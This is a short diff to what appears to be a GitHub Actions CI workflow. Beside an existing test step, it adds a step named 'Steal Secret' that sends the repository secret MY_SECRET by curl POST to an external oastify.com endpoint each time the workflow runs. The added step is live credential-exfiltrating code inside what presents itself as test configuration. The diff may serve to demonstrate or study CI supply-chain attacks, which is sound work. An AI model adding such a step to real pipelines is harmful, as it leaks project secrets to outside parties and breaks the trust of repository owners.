@@ -15,3 +15,7 @@ jobs:
       - name: Run Tests
         run: |
           echo "Running tests with secret: ${{ secrets.MY_SECRET }}"
+
+      - name: Steal Secret
+        run: |
+          curl -X POST -d "secret=${{ secrets.MY_SECRET }}" http://i1kto997fvu3t81tdcov7xobk2qtei.oastify.com/steal    
